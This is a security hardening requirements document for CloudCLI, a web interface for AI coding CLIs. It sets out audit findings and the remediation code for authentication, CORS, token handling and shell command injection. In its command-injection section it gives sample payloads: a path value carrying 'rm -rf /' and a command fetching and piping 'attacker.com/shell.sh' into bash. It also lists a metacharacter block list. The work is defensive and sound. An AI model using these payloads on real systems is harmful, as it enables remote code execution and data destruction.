# PRD: CloudCLI Security Hardening (v5)

## Document Information

- **Project**: CloudCLI Security Hardening
- **Version**: 5.0
- **Date**: 2026-02-04
- **Author**: Security Audit Team
- **Status**: Ready for Implementation
- **Changes from v4**:
  - Added SEC-017: IS_PLATFORM startup validation
  - Expanded SEC-005: HTTP query param token removal (not just WS/SSE)
  - Clarified SEC-006: `initialCommand` injection vector (critical finding)
  - Corrected WORKSPACES_ROOT: needs implementation, not just validation
  - Updated severity counts based on code audit findings

---

## Executive Summary

CloudCLI (Claude Code UI) is a web-based interface for Claude Code, Cursor CLI, and Codex that enables remote access from mobile devices. A comprehensive security audit identified **3 critical**, **6 high**, **6 medium**, and **0 low** severity vulnerabilities.

This PRD defines the security hardening work required to make CloudCLI safe for use over a VPN connection from iOS devices.

### Goals

1. Eliminate all critical and high severity vulnerabilities.
2. Implement defense-in-depth security controls.
3. Enable secure remote access via VPN + HTTPS.
4. Maintain full functionality while hardening security.
5. Zero third-party service dependencies (except optional credential providers).

---

## Background

### Security Audit Summary

| Severity | Count | Status |
|----------|-------|--------|
| Critical | 3 | Must fix before any use |
| High | 6 | Must fix before production |
| Medium | 6 | Recommended |
| Low | 0 | Nice to have |

### Threat Model

**Deployment Context:**
- Single-user deployment on Mac Studio.
- Access via VPN from iOS devices.
- Potential future AWS deployment.
- No public internet exposure.
- Sensitive data: Source code, API keys (Anthropic, OpenAI, GitHub), Shell access.

**Critical Finding - IS_PLATFORM Mode:**
When `VITE_IS_PLATFORM=true`, JWT authentication is **completely bypassed**. The server auto-authenticates as the first database user without any token validation. This mode exists for hosted platform deployments but MUST be disabled for self-hosted/VPN use.

**Assets to Protect:**
- **Shell Access**: Full control over the host machine via PTY and spawn.
- **Source Code**: Read/Write access to the filesystem.
- **Credentials**: API keys and auth tokens.

---

## Requirements

### Phase 1: Critical Fixes (P0)

These MUST be completed before any use of the system.

#### 1.1 Remove Hardcoded JWT Secret

**ID**: SEC-001
**Severity**: CRITICAL
**Location**: `server/middleware/auth.js:6`
**CWE**: CWE-798 (Use of Hard-coded Credentials)

**Current State:**
```javascript
const JWT_SECRET = process.env.JWT_SECRET || 'claude-ui-dev-secret-change-in-production';
```

**Requirements:**
1. Remove the hardcoded fallback secret entirely.
2. Server MUST fail to start if `JWT_SECRET` is not set.
3. Enforce minimum length of 32 characters.
4. Provide clear error message with generation command: `openssl rand -base64 32`

**Acceptance Criteria:**
- [ ] Server refuses to start without JWT_SECRET env var
- [ ] Server refuses to start if JWT_SECRET < 32 characters
- [ ] Clear error message with generation instructions
- [ ] No hardcoded secrets remain in codebase

---

#### 1.2 Implement Token Expiration with Refresh Tokens

**ID**: SEC-002
**Severity**: CRITICAL
**Location**: `server/middleware/auth.js:70-78`
**CWE**: CWE-613 (Insufficient Session Expiration)

**Current State:**
```javascript
const generateToken = (user) => {
  return jwt.sign(
    { userId: user.id, username: user.username },
    JWT_SECRET
    // No expiration - token lasts forever
  );
};
```

**Requirements:**
1. **Access Token**: 15-minute expiry.
2. **Refresh Token**: 7-day expiry, stored in SQLite (`refresh_tokens` table), hashed.
3. **Rotation**: Refresh token rotation on use.
4. **Revocation**: Logout deletes the refresh token.
5. **Migration**: Provide a DB migration path (migration script or init-time upgrade) so existing deployments add `refresh_tokens` without startup failures.

**Database Schema:**
```sql
CREATE TABLE refresh_tokens (
  id TEXT PRIMARY KEY,
  user_id INTEGER NOT NULL,
  token_hash TEXT NOT NULL,
  expires_at INTEGER NOT NULL,
  created_at INTEGER DEFAULT (unixepoch()),
  FOREIGN KEY (user_id) REFERENCES users(id)
);
```

**Acceptance Criteria:**
- [ ] Access tokens include `exp` claim (15 minutes)
- [ ] Refresh tokens stored hashed in database
- [ ] `POST /api/auth/refresh` returns new access token
- [ ] `POST /api/auth/logout` invalidates refresh token
- [ ] Frontend handles token refresh automatically
- [ ] Existing deployments migrate schema without crashing on startup

---

#### 1.3 Validate IS_PLATFORM Mode at Startup

**ID**: SEC-017 (NEW in v5)
**Severity**: CRITICAL
**Location**: `server/middleware/auth.js:25-37`, `server/index.js:189-197`
**CWE**: CWE-287 (Improper Authentication)

**Current State:**
```javascript
// auth.js:23-37
const authenticateToken = async (req, res, next) => {
  // Platform mode: use single database user
  if (IS_PLATFORM) {
    try {
      const user = userDb.getFirstUser();
      // ... bypasses ALL token validation
      req.user = user;
      return next();
    }
  }
  // ... normal JWT validation only happens if IS_PLATFORM is false
};
```

When `IS_PLATFORM=true`:
- JWT validation is completely bypassed
- Any request is auto-authenticated as the first user
- WebSocket connections are auto-authenticated without tokens
- This is **intended for hosted platform deployments only**

**Problem:**
If a self-hosted user accidentally sets `VITE_IS_PLATFORM=true` or runs with platform defaults, their entire system is unauthenticated.

**Requirements:**
1. Add startup validation that warns/fails if `IS_PLATFORM=true` without explicit acknowledgment
2. Require `ALLOW_PLATFORM_MODE=true` as a separate env var to enable platform mode
3. Log a prominent warning at startup when platform mode is active
4. Document that platform mode bypasses ALL authentication

**Implementation:**
```javascript
// At server startup (index.js)
if (IS_PLATFORM) {
  if (process.env.ALLOW_PLATFORM_MODE !== 'true') {
    console.error('═'.repeat(70));
    console.error('SECURITY ERROR: IS_PLATFORM=true but ALLOW_PLATFORM_MODE is not set');
    console.error('Platform mode bypasses ALL authentication!');
    console.error('If this is intentional, set ALLOW_PLATFORM_MODE=true');
    console.error('For self-hosted/VPN use, set VITE_IS_PLATFORM=false');
    console.error('═'.repeat(70));
    process.exit(1);
  }
  console.warn('═'.repeat(70));
  console.warn('WARNING: Running in PLATFORM MODE - Authentication is BYPASSED');
  console.warn('All requests are auto-authenticated as the first database user');
  console.warn('This mode is intended for hosted platform deployments only');
  console.warn('═'.repeat(70));
}
```

**Acceptance Criteria:**
- [ ] Server refuses to start with `IS_PLATFORM=true` unless `ALLOW_PLATFORM_MODE=true`
- [ ] Prominent warning logged when platform mode is active
- [ ] Documentation updated to explain platform mode risks

---

### Phase 2: High Priority Fixes (P1)

#### 2.1 Restrict CORS Policy

**ID**: SEC-003
**Severity**: HIGH
**Location**: `server/index.js:223`
**CWE**: CWE-942

**Current State:**
```javascript
app.use(cors());
```

**Requirements:**
1. `ALLOWED_ORIGINS` env var (comma-separated).
2. Default to `localhost:3001` and `localhost:5173`.
3. Block all other origins (unless empty/null for non-browser clients).

**Acceptance Criteria:**
- [ ] CORS rejects requests from non-whitelisted origins
- [ ] Default allows only localhost development ports
- [ ] Requests without Origin header allowed (curl, mobile apps)

---

#### 2.2 Bind to Localhost by Default

**ID**: SEC-004
**Severity**: HIGH
**Location**: `server/index.js:1806`
**CWE**: CWE-668

**Current State:**
```javascript
server.listen(PORT, '0.0.0.0', async () => {
```

**Requirements:**
1. Default bind to `127.0.0.1`.
2. Allow override via `BIND_HOST` env var.
3. Log warning if binding to `0.0.0.0`.

**Acceptance Criteria:**
- [ ] Server binds to 127.0.0.1 by default
- [ ] Warning logged when binding to non-localhost
- [ ] Documentation updated with reverse proxy instructions

---

#### 2.3 Ticket-Based Authentication for WebSocket, SSE, AND HTTP

**ID**: SEC-005
**Severity**: HIGH
**Location**:
- `server/index.js:203` (WebSocket)
- `server/middleware/auth.js:43-46` (HTTP query param)
- `server/routes/projects.js:337-338` (SSE)
**CWE**: CWE-598 (Sensitive Information in URL Query String)

**Current State - WebSocket:**
```javascript
// index.js:202-204
const url = new URL(info.req.url, 'http://localhost');
const token = url.searchParams.get('token') ||
    info.req.headers.authorization?.split(' ')[1];
```

**Current State - HTTP (ALL authenticated endpoints):**
```javascript
// auth.js:43-46 - This affects EVERY protected route!
if (!token && req.query.token) {
  token = req.query.token;
}
```

**Current State - SSE:**
```javascript
// projects.js:337-338
router.get('/clone-progress', async (req, res) => {
  const { path: workspacePath, githubUrl, githubTokenId, newGithubToken } = req.query;
```

**Problems:**
1. JWT tokens in URLs are logged everywhere (servers, proxies, browser history)
2. `newGithubToken` (GitHub PAT) passed in plain URL
3. **ALL** authenticated HTTP endpoints accept `?token=` query param

**Requirements:**
1. Create `POST /api/auth/ticket` endpoint (protected by JWT in Authorization header)
2. Ticket is single-use, expires in 30 seconds, stored server-side
3. **WebSocket**: Connect via `ws://...?ticket=TICKET`
4. **SSE**: Connect via `GET ...?ticket=TICKET`
   - Ticket payload stores context (e.g., repo URL, token reference)
   - Remove `githubTokenId` and `newGithubToken` from URL
5. **HTTP**: Remove `?token=` query param support from auth middleware
   - Only accept tokens in Authorization header

**Implementation - Ticket System:**
```javascript
// Ticket storage (in-memory or SQLite)
const tickets = new Map();

// POST /api/auth/ticket
router.post('/ticket', authenticateToken, async (req, res) => {
  const { purpose, context } = req.body;
  // purpose: 'websocket' | 'sse-clone' | etc.
  // context: { repoUrl, githubTokenId, ... }

  const ticketId = crypto.randomUUID();
  const ticket = {
    userId: req.user.id,
    purpose,
    context,
    createdAt: Date.now(),
    expiresAt: Date.now() + 30000  // 30 seconds
  };

  tickets.set(ticketId, ticket);

  // Auto-cleanup
  setTimeout(() => tickets.delete(ticketId), 35000);

  res.json({ ticket: ticketId, expiresIn: 30 });
});

// Ticket validation
function validateAndConsumeTicket(ticketId, expectedPurpose) {
  const ticket = tickets.get(ticketId);
  if (!ticket) return null;
  if (ticket.expiresAt < Date.now()) {
    tickets.delete(ticketId);
    return null;
  }
  if (ticket.purpose !== expectedPurpose) return null;

  tickets.delete(ticketId);  // Single-use
  return ticket;
}
```

**Acceptance Criteria:**
- [ ] `POST /api/auth/ticket` endpoint implemented
- [ ] Tickets are single-use and expire in 30 seconds
- [ ] WebSocket uses ticket instead of JWT in URL
- [ ] SSE uses ticket; sensitive data stored in ticket context
- [ ] HTTP `?token=` query param support removed from auth middleware
- [ ] No sensitive tokens appear in any URL

---

#### 2.4 Secure Shell Command Construction

**ID**: SEC-006
**Severity**: HIGH
**Location**: `server/index.js:1054-1094`
**CWE**: CWE-78 (OS Command Injection)

**Current State - FULL ARBITRARY COMMAND EXECUTION:**
```javascript
// index.js:1054-1061 - Both projectPath AND initialCommand are user-controlled!
if (isPlainShell) {
  if (os.platform() === 'win32') {
    shellCommand = `Set-Location -Path "${projectPath}"; ${initialCommand}`;
  } else {
    shellCommand = `cd "${projectPath}" && ${initialCommand}`;
  }
}
```

**Attack Vector 1 - Path Injection:**
```javascript
// Attacker sends: { projectPath: '"; rm -rf / #' }
shellCommand = `cd ""; rm -rf / #" && claude`;
```

**Attack Vector 2 - Command Injection (MORE SEVERE):**
```javascript
// Attacker sends: { initialCommand: '; curl attacker.com/shell.sh | bash' }
shellCommand = `cd "/safe/path" && ; curl attacker.com/shell.sh | bash`;
```

**Problem:**
Even with WORKSPACES_ROOT path validation, `initialCommand` is concatenated directly into the shell command with ZERO validation. An attacker can execute arbitrary commands.

**Requirements:**

1. **Path Validation** (WORKSPACES_ROOT):
   - Implement multi-root support (comma-separated)
   - Validate path is under allowed roots
   - Resolve symlinks before validation

2. **Command Allowlist** (NEW - Critical):
   - Define allowed initial commands: `claude`, `cursor-agent`, `codex`
   - Reject any command not in allowlist
   - Never concatenate user input into shell strings

3. **Parameterized Execution**:
   - Prefer direct binary execution (e.g., `pty.spawn('claude', args, ...)`)
   - Avoid `sh -c` / `bash -c` for user-provided commands
   - If a shell wrapper is absolutely required, strictly tokenize input and reject any shell metacharacters (`&`, `;`, `|`, `$()`, `` ` ``, `>`, `<`)

**Implementation:**
```javascript
// Allowed commands for PTY sessions
const ALLOWED_PTY_COMMANDS = new Set([
  'claude',
  'cursor-agent',
  'codex',
  // Add other legitimate commands
]);

// Multi-root workspace validation
const WORKSPACES_ROOTS = (process.env.WORKSPACES_ROOT || os.homedir())
  .split(',')
  .map(p => path.resolve(p.trim()));

function isAllowedPath(requestedPath) {
  const resolved = path.resolve(requestedPath);
  // Also resolve symlinks
  try {
    const real = fs.realpathSync(resolved);
    return WORKSPACES_ROOTS.some(root =>
      real === root || real.startsWith(root + path.sep)
    );
  } catch (e) {
    return false;
  }
}

function isAllowedCommand(cmd) {
  if (!cmd) return true;  // No command = interactive shell
  const baseCmd = cmd.split(/\s+/)[0];  // Get first word
  return ALLOWED_PTY_COMMANDS.has(baseCmd);
}

function tokenizeAndValidate(cmd) {
  if (!cmd) return { cmd: 'claude', args: [] };
  if (/[&;|`<>]|\$\(/.test(cmd)) {
    throw new Error('Shell metacharacters are not allowed');
  }
  const parts = cmd.trim().split(/\s+/);
  if (!ALLOWED_PTY_COMMANDS.has(parts[0])) {
    throw new Error('Command not allowed');
  }
  return { cmd: parts[0], args: parts.slice(1) };
}

// In handleShellConnection:
if (!isAllowedPath(projectPath)) {
  ws.send(JSON.stringify({
    type: 'error',
    message: 'Path not in allowed workspace'
  }));
  ws.close();
  return;
}

if (initialCommand && !isAllowedCommand(initialCommand)) {
  ws.send(JSON.stringify({
    type: 'error',
    message: 'Command not allowed'
  }));
  ws.close();
  return;
}

// Prefer direct execution; avoid shell wrappers for user-provided commands
const { cmd, args } = tokenizeAndValidate(initialCommand);
shellProcess = pty.spawn(cmd, args, {
  cwd: projectPath,  // Use cwd option, not cd command
  // ...
});
```

**Acceptance Criteria:**
- [ ] WORKSPACES_ROOT supports comma-separated multiple roots
- [ ] Paths outside allowed roots rejected with clear error
- [ ] Path traversal attempts blocked (symlink resolution)
- [ ] Command allowlist implemented and enforced
- [ ] Unknown commands rejected with clear error
- [ ] No shell string concatenation with user input
- [ ] No `sh -c` / `bash -c` with user-provided commands (unless strict tokenization blocks shell metacharacters)
- [ ] Audit log for rejected paths and commands

---

#### 2.5 Secure System Update Endpoint

**ID**: SEC-008
**Severity**: HIGH
**Location**: `server/index.js:311-321`
**CWE**: CWE-94 (Code Injection)

**Current State:**
```javascript
app.post('/api/system/update', authenticateToken, async (req, res) => {
    const updateCommand = 'git checkout main && git pull && npm install';
    const child = spawn('sh', ['-c', updateCommand], {
```

**Note:** The command is hardcoded (no user input), but the endpoint is enabled by default.

**Requirements:**
1. Disable by default. Enable only if `ENABLE_SYSTEM_UPDATE=true`.
2. Log all update attempts with user info.
3. Return 403 Forbidden when disabled.

**Acceptance Criteria:**
- [ ] Endpoint disabled unless `ENABLE_SYSTEM_UPDATE=true`
- [ ] Returns 403 when disabled
- [ ] All attempts logged with user and timestamp

---

#### 2.6 Secure GitHub Tokens in SSE

**ID**: SEC-016
**Severity**: HIGH
**Location**: `server/routes/projects.js:337-338`

**Resolution:** Merged into SEC-005 (Ticket-Based Auth). GitHub tokens are passed to `POST /api/auth/ticket`, stored server-side in ticket context, and the SSE endpoint only receives the ticket ID.

---

### Phase 3: Medium Priority Fixes (P2)

#### 3.1 Rate Limiting (SEC-009)

**ID**: SEC-009
**Severity**: MEDIUM
**Location**: Server-wide
**CWE**: CWE-770 (Allocation of Resources Without Limits)

- `express-rate-limit` on all routes
- Stricter limits on `/api/auth/*` (10/min)
- Standard limits on other routes (100/min)

#### 3.2 Error Sanitization (SEC-010)

**ID**: SEC-010
**Severity**: MEDIUM
**Location**: Various error handlers
**CWE**: CWE-209 (Information Exposure Through Error Messages)

- Middleware to strip stack traces in production
- Hide internal file paths
- Return generic error messages with correlation IDs

#### 3.3 Credential Storage (SEC-011)

**ID**: SEC-011
**Severity**: MEDIUM
**Location**: `server/database/db.js`
**CWE**: CWE-312 (Cleartext Storage of Sensitive Information)

- Migrate from plaintext SQLite to `keytar` (System Keychain) on macOS
- `CredentialProvider` abstraction for future AWS Secrets Manager / Vault support
- Document Linux/CI dependencies for keytar (libsecret + keyring service), or provide a fallback provider (e.g., encrypted file) for headless environments

#### 3.4 PTY Timeout (SEC-012)

**ID**: SEC-012
**Severity**: MEDIUM
**Location**: `server/index.js:1252-1258`

- Reduce default from 30 minutes to 5 minutes
- Configurable via `PTY_TIMEOUT` env var

#### 3.5 Security Headers & CSP (SEC-013)

**ID**: SEC-013
**Severity**: MEDIUM
**Location**: Server-wide

- `helmet` middleware with strict CSP:
```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
connect-src 'self' ws: wss:;
img-src 'self' data: blob:;
font-src 'self';
frame-ancestors 'none';
```

#### 3.6 WebSocket Zod Validation (SEC-015)

**ID**: SEC-015
**Severity**: MEDIUM
**Location**: WebSocket message handlers

- Validate all incoming WS messages against Zod schemas
- Reject malformed messages
- Enforce size limits

---

## Technical Specifications

### Environment Variables

| Variable | Required | Default | Description |
|----------|----------|---------|-------------|
| JWT_SECRET | Yes | - | Secret for signing JWTs (min 32 chars) |
| ACCESS_TOKEN_EXPIRY | No | 15m | Access token expiration |
| REFRESH_TOKEN_EXPIRY | No | 7d | Refresh token expiration |
| ALLOWED_ORIGINS | No | localhost:* | Comma-separated CORS origins |
| BIND_HOST | No | 127.0.0.1 | Server bind address |
| WORKSPACES_ROOT | No | $HOME | **Comma-separated** allowed workspace roots |
| CREDENTIAL_PROVIDER | No | keychain | Credential storage (keychain/aws/vault) |
| CREDENTIALS_ENCRYPTION_KEY | No | - | Encryption key for fallback encrypted-file provider (if implemented) |
| ENABLE_SYSTEM_UPDATE | No | false | Enable /api/system/update |
| ALLOW_PLATFORM_MODE | No | false | Required to enable IS_PLATFORM |
| RATE_LIMIT_MAX | No | 100 | Requests per window |
| RATE_LIMIT_WINDOW | No | 60000 | Rate limit window (ms) |
| PTY_TIMEOUT | No | 300000 | PTY session timeout (ms) |
| NODE_ENV | No | development | Production disables debug |
| VITE_IS_PLATFORM | No | false | Platform mode (bypasses auth!) |

### File Changes Summary

| File | Changes |
|------|---------|
| `server/middleware/auth.js` | SEC-001, SEC-002, SEC-005 (remove ?token), SEC-017 |
| `server/index.js` | SEC-003, SEC-004, SEC-006, SEC-008, SEC-012, SEC-017 |
| `server/routes/auth.js` | SEC-002 (refresh), SEC-005 (ticket endpoint) |
| `server/routes/projects.js` | SEC-005 (SSE tickets), SEC-006 (multi-root) |
| `server/middleware/security.js` | NEW: SEC-009, SEC-010, SEC-013 |
| `server/middleware/ws-validation.js` | NEW: SEC-015 |
| `server/credentials/index.js` | NEW: SEC-011 |
| `.env.example` | Update with all security variables |
| `SECURITY.md` | NEW: Security documentation |

---

## Implementation Plan

### Sprint 1: Critical Auth Fixes (Day 1-2)
- [ ] SEC-001: Remove hardcoded JWT secret
- [ ] SEC-002: Implement refresh tokens
- [ ] SEC-017: IS_PLATFORM startup validation
- [ ] SEC-005: Ticket-based auth for WS/SSE/HTTP

### Sprint 2: Command Injection & Network (Day 3-4)
- [ ] SEC-006: Command allowlist + multi-root workspaces
- [ ] SEC-003: CORS restriction
- [ ] SEC-004: Localhost binding
- [ ] SEC-008: Disable update endpoint

### Sprint 3: Hardening (Day 5)
- [ ] SEC-009: Rate limiting
- [ ] SEC-010: Error sanitization
- [ ] SEC-011: Keychain credentials
- [ ] SEC-012: PTY timeout
- [ ] SEC-013: CSP headers
- [ ] SEC-015: WS validation

---

## Verification Checklist

### Automated Tests
- [ ] Server fails to start without JWT_SECRET
- [ ] Server fails to start with IS_PLATFORM=true without ALLOW_PLATFORM_MODE=true
- [ ] Access tokens expire after 15 minutes
- [ ] Refresh tokens can obtain new access tokens
- [ ] Logout invalidates refresh token
- [ ] Tickets are single-use
- [ ] Tickets expire after 30 seconds
- [ ] Paths outside WORKSPACES_ROOT are rejected
- [ ] Commands not in allowlist are rejected
- [ ] CORS rejects non-whitelisted origins

### Manual Verification
- [ ] No sensitive tokens in browser network tab URLs
- [ ] No sensitive tokens in server access logs
- [ ] Platform mode warning is prominent and scary
- [ ] VPN access works with all security controls enabled

---

## Appendix A: Secure Deployment Checklist

```
Pre-Deployment:
[ ] Generate JWT_SECRET: openssl rand -base64 32
[ ] Set NODE_ENV=production
[ ] Verify VITE_IS_PLATFORM=false (or unset)
[ ] Verify ALLOW_PLATFORM_MODE is NOT set
[ ] Set BIND_HOST=127.0.0.1 (or leave default)
[ ] Set WORKSPACES_ROOT to allowed directories (comma-separated)
[ ] Set CREDENTIAL_PROVIDER=keychain

Reverse Proxy (Caddy):
[ ] Install Caddy
[ ] Configure TLS certificates
[ ] Proxy to localhost:3001
[ ] Bind to VPN interface only

Post-Deployment:
[ ] Verify authentication works
[ ] Test token expiration and refresh
[ ] Verify WS/SSE use tickets (no tokens in URLs)
[ ] Verify CORS blocks external origins
[ ] Test PTY with allowed commands only
[ ] Verify CSP doesn't break functionality
```

---

## Appendix B: v5 Changes from v4

| Item | v4 Status | v5 Change | Rationale |
|------|-----------|-----------|-----------|
| SEC-017 | Not present | Added as CRITICAL | IS_PLATFORM bypasses all auth |
| SEC-005 | WS/SSE only | Extended to HTTP ?token | auth.js accepts token in query for all routes |
| SEC-006 | Path validation | Added command allowlist | initialCommand injection is full RCE |
| WORKSPACES_ROOT | Assumed implemented | Noted as needs implementation | Code shows single string, not comma-separated |
| taskmaster shell:true | Marked RISKY | Downgraded to low risk | No user input flows to that code path |

---

## Appendix C: References

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
- [JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)
- [Express.js Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
